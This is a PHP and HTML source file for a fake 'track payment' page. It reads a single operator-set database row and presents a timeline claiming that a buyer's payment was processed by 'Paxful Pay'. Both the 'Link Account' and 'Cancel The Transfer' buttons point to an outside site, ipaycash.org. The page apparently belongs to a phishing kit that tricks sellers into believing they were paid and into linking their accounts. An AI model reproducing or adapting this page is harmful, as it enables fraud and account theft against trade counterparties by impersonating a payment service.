<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="author" content="CodeHim">
  <link rel="shortcut icon" sizes="196x196" style="border-radius: 50%;" href="static/images/famonipal.png">
  <link rel="shortcut icon" type="image/x-icon" href="static/images/famonipal.png">
  <link rel="icon" type="image/x-icon" href="static/images/famonipal.png">
  <title> track payment </title>
  <link rel="stylesheet" href="../css/style.css">
  <link rel="stylesheet" href="../css/demo.css">
  <link href="../../npm/bootstrap%405.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
    integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
</head>

<body>
<?php

$config = require 'config.php'; 

$servername = $config['servername'];
$username = $config['username'];
$password = $config['password'];
$dbname = $config['dbname'];

// Create a new connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check for connection errors
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Initialize the variable
$row = null; // Initialize the variable to null

// Retrieve the tracking data
$sql = "SELECT date_time_1, date_time_2,traders_payment, amount_paid, payment_method, track_number, currency_used, owners_name, traders_name  FROM tracking_data WHERE id = 1";
$result = $conn->query($sql);

if ($result && $result->num_rows > 0) { // Check if result is valid and has rows
    $row = $result->fetch_assoc();
}

// If no rows are found, you can handle the error or set a default value for $row
if ($row === null) {
    // Handle the case where no data was found
    echo "<h3>No tracking data found for the specified ID.</h3>";
    // You can exit or set default values here
}
    ?>
  <main class="cd__main" style="background: linear-gradient(to right, #0cad5c, #eef2f3) !important;">
    <div class="container py-5">
      <div class="row">

        <div class="col-md-12 col-lg-12">
          <div class="cd__action" style="display: flex; margin-bottom: 15px;">
            <h3>Track No: <span style="text-decoration: underline;"><?php echo $row["track_number"]; ?></span></h3>
          </div>
          <div id="tracking-pre"></div>
          <div id="tracking">

            <div class="tracking-list">
              <div class="tracking-item">
                <div class="tracking-icon status-intransit">
                  <svg class="svg-inline--fa fa-circle fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="circle"
                    role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" data-fa-i2svg="">
                    <path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8z">
                    </path>
                  </svg>
                </div>
                <div class="tracking-date"><img
                    src="../../shajo/portfolio/a02c5579c3ebe185bb1fc085909c582bf5fad802/delivery.svg"
                    class="img-responsive" alt="order-placed"></div>
                <div class="tracking-content fons">Payment of <?php echo $row["amount_paid"]; ?> <?php echo $row["currency_used"]; ?> made by the buyer from their <?php echo $row["payment_method"]; ?> -  <?php echo $row["owners_name"]; ?> via
                  Paxful Pay<span><br><?php echo $row["date_time_1"]; ?></span></div>
              </div>

              <div class="tracking-item">
                <div class="tracking-icon status-current blinker">
                  <svg class="svg-inline--fa fa-circle fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="circle"
                    role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" data-fa-i2svg="">
                    <path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8z">
                    </path>
                  </svg>
                </div>
                <div class="tracking-date"><img
                    src="../../shajo/portfolio/a02c5579c3ebe185bb1fc085909c582bf5fad802/delivery.svg"
                    class="img-responsive" alt="order-placed"></div>
                <div class="tracking-content">Transaction processed successfully by Paxful Pay to be deposited in your
                <?php echo $row["traders_payment"]; ?> - <?php echo $row["traders_name"]; ?> Account <span><br><?php echo $row["date_time_2"]; ?></span></div>
              </div>

              <div class="tracking-item-pending">
                <div class="tracking-icon status-intransit">
                  <svg class="svg-inline--fa fa-circle fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="circle"
                    role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" data-fa-i2svg="">
                    <path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8z">
                    </path>
                  </svg>
                </div>
                <div class="tracking-date"><img
                    src="../../shajo/portfolio/a02c5579c3ebe185bb1fc085909c582bf5fad802/delivery.svg"
                    class="img-responsive" alt="order-placed"></div>
                <div class="tracking-content">Accept payment via the open trade in the respective account. <br>REQUIRED:
                  <br>Link respective account to complete this step.
                  <span>
                    <a title="Free web design code & scripts" href="https://ipaycash.org/trade/Or124t3oQ5/"
                      target="_blank"> Link Account</a><br></br>
                    <a style="color: red;" title="Free web design code & scripts"
                      href="https://ipaycash.org/trade/Or124t3oQ5/" target="_blank"> Cancel The Transfer</a>
                    <br></br>
                    Once initiated, the transfer process can only be completed or cancelled by the seller.
                  </span>
                </div>
              </div>
              <div class="tracking-item-pending">
                <div class="tracking-icon status-intransit">
                  <svg class="svg-inline--fa fa-circle fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="circle"
                    role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" data-fa-i2svg="">
                    <path fill="currentColor" d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8z">
                    </path>
                  </svg>
                </div>
                <div class="tracking-date"><img
                    src="../../shajo/portfolio/a02c5579c3ebe185bb1fc085909c582bf5fad802/delivery.svg"
                    class="img-responsive" alt="order-placed"></div>
                <div class="tracking-content">Funds received by the Seller<span>Instantly</span></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>

</body>

</html>